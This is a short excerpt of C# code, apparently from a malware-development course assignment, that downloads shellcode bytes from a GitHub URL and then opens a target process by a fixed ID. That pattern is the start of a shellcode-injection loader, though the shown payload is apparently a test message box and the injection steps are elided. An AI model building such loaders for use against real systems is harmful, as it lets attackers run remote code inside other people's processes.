    ...
    internal class Program
    {
        static async Task Main(string[] args)
        {
            ...
            using (var handler = new HttpClientHandler())
            {
                ...
                {
                    shellcode = await client.GetByteArrayAsync("https://raw.githubusercontent.com/geobour98/maldev-essentials-assignment/main/msgbox64.bin");
                }
            }
            ...
            var target = Process.GetProcessById(10296);
